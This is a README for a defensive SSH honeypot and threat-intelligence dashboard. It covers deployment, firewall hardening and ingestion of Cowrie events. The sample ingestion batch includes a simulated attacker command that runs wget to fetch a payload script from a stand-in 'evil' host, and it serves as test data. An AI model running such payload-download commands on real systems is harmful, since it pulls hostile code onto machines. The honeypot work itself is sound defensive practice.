# SetTrap Command

A production-grade defensive honeypot management and attacker intelligence platform.

**IMPORTANT: Deploy only on an isolated VPS with a dedicated IP address. Never run on a home network or shared machine. Port 2222 is intentionally exposed to the internet to attract real attackers.**

---

## Versioning

The current version is defined in `src/lib/version.ts`:

```ts
export const APP_VERSION = "0.2.0";
export const APP_VERSION_LABEL = "Phase 1.5 Intelligence Upgrade";
```

After every meaningful update, bump `APP_VERSION` in `lib/version.ts` and update `APP_VERSION_LABEL` when the phase changes. The footer on every admin page reads from this file — never hardcode the version elsewhere.

---

## Architecture

```
Internet
   │  (port 2222)
   ▼
Cowrie SSH Honeypot  ──► /api/ingest/cowrie  ──► PostgreSQL
                                                      │
                                               Intelligence Engine
                                               (classify + score)
                                                      │
                                               Admin Dashboard
                                               (Next.js + React)
```

**Components:**
- `app` — Next.js 15 application (dashboard + API)
- `postgres` — PostgreSQL 16 (session/event storage)
- `cowrie` — Cowrie SSH honeypot (fake SSH server, no real execution)

---

## VPS Deployment

### 1. Provision server

Use a dedicated VPS (DigitalOcean, Vultr, Hetzner). Minimum: 1 vCPU, 1 GB RAM, Ubuntu 22.04.

### 2. Install dependencies

```bash
apt update && apt install -y docker.io docker-compose-plugin git
```

### 3. Clone and configure

```bash
git clone <your-repo> /opt/settrap
cd /opt/settrap

cp .env.example .env
nano .env
```

Set these values in `.env`:

```env
POSTGRES_PASSWORD=<strong-random-password>
ADMIN_SECRET=<minimum-32-char-random-string>
INGEST_SECRET=<another-random-secret>
```

Generate secrets:
```bash
openssl rand -hex 32
```

### 4. Build and start

```bash
docker compose up -d --build
```

Run database migrations:
```bash
docker compose exec app npx prisma migrate deploy
docker compose exec app npm run db:seed
```

### 5. Reverse proxy (nginx example)

```nginx
server {
    listen 443 ssl;
    server_name settrap.yourdomain.com;

    ssl_certificate /etc/letsencrypt/live/settrap.yourdomain.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/settrap.yourdomain.com/privkey.pem;

    location / {
        proxy_pass http://127.0.0.1:3000;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }
}
```

### 6. Firewall rules

```bash
# Allow SSH management (your IP only)
ufw allow from <your-ip> to any port 22
# Allow honeypot port from anywhere
ufw allow 2222/tcp
# Allow HTTPS
ufw allow 443/tcp
# Block everything else
ufw default deny incoming
ufw enable
```

**Block outbound from Cowrie container** (prevents downloaded payloads from beaconing):
```bash
# Get Cowrie container IP
COWRIE_IP=$(docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' settrap-cowrie-1)
iptables -I DOCKER-USER -s $COWRIE_IP -j DROP
```

---

## Local Development

```bash
# Start PostgreSQL only
docker compose up postgres -d

# Install deps
npm install

# Generate Prisma client
npm run db:generate

# Apply migrations
npx prisma migrate dev

# Seed
npm run db:seed

# Set env
cp .env.example .env.local
# Edit .env.local with local DATABASE_URL

# Start dev server
npm run dev
```

Access at http://localhost:3000 — you'll be redirected to /login.

Use the `ADMIN_SECRET` from your `.env.local` to log in.

---

## Testing ingestion

Send a sample Cowrie event batch:

```bash
curl -X POST http://localhost:3000/api/ingest/cowrie \
  -H "Content-Type: application/json" \
  -H "x-ingest-secret: your-ingest-secret" \
  -d '{
    "honeypotId": "<id-from-db>",
    "events": [
      {
        "eventid": "cowrie.session.connect",
        "timestamp": "2024-01-01T10:00:00.000Z",
        "session": "abc123",
        "src_ip": "1.2.3.4",
        "src_port": 45678
      },
      {
        "eventid": "cowrie.login.failed",
        "timestamp": "2024-01-01T10:00:01.000Z",
        "session": "abc123",
        "src_ip": "1.2.3.4",
        "username": "root",
        "password": "123456"
      },
      {
        "eventid": "cowrie.command.input",
        "timestamp": "2024-01-01T10:00:05.000Z",
        "session": "abc123",
        "src_ip": "1.2.3.4",
        "input": "wget http://evil.example.com/payload.sh"
      },
      {
        "eventid": "cowrie.session.closed",
        "timestamp": "2024-01-01T10:00:10.000Z",
        "session": "abc123",
        "src_ip": "1.2.3.4"
      }
    ]
  }'
```

---

## Honeypot types (roadmap)

The data model supports future honeypot types:

| Type | Status | Notes |
|------|--------|-------|
| SSH (Cowrie) | Implemented | Full event ingestion |
| HTTP login page | Planned | Fake admin login portal |
| WordPress | Planned | xmlrpc + login brute force capture |
| Redis | Planned | Unauthenticated Redis emulation |
| MongoDB | Planned | Fake MongoDB with logging |
| IoT/Router | Planned | Telnet + default creds capture |

---

## Security controls

- All admin routes require `ADMIN_SECRET` via cookie or `x-admin-secret` header
- Cowrie never executes attacker commands — responses are pre-configured fakes
- Passwords stored as SHA-256 hashes only; never plaintext
- Runtime control uses an explicit service allowlist; no user input reaches the shell
- Audit log records all control actions (start/stop/pause/restart)
- `ADMIN_SECRET` must be set at startup — server refuses to start without it

---

## Disclaimer

This platform is for **defensive security monitoring only**. It simulates vulnerable services to collect threat intelligence. You are responsible for complying with applicable laws regarding honeypot deployment in your jurisdiction.
